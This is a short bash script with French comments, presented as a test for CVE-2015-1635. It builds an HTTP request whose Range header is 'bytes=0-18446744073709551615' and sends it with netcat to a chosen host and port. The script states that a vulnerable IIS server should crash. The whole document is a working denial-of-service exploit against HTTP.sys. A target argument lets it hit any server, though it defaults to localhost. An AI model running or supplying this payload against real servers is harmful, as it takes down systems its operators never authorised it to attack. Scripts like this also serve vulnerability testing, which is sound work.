#!/bin/bash
# Script de test pour CVE-2015-1635

TARGET_IP="${1:-127.0.0.1}"
TARGET_PORT="${2:-8080}"
RESOURCE="${3:-/iisstart.htm}"

echo "[*] Test CVE-2015-1635 (HTTP.sys Range DoS)"
echo "[*] ========================================"
echo "[*] Cible: $TARGET_IP:$TARGET_PORT"
echo "[*] Ressource: $RESOURCE"
echo ""

# Générer le payload
PAYLOAD_FILE="/tmp/cve_2015_1635_payload.txt"
cat > "$PAYLOAD_FILE" << EOF
GET $RESOURCE HTTP/1.1
Host: $TARGET_IP
Range: bytes=0-18446744073709551615
Connection: close

EOF

echo "[*] Envoi du payload DoS..."
echo ""

# Envoyer via netcat
nc "$TARGET_IP" "$TARGET_PORT" < "$PAYLOAD_FILE"

echo ""
echo "[+] Test terminé"
echo "[*] Note: Si le serveur est vulnérable, il devrait planter ou répondre avec une erreur 416"

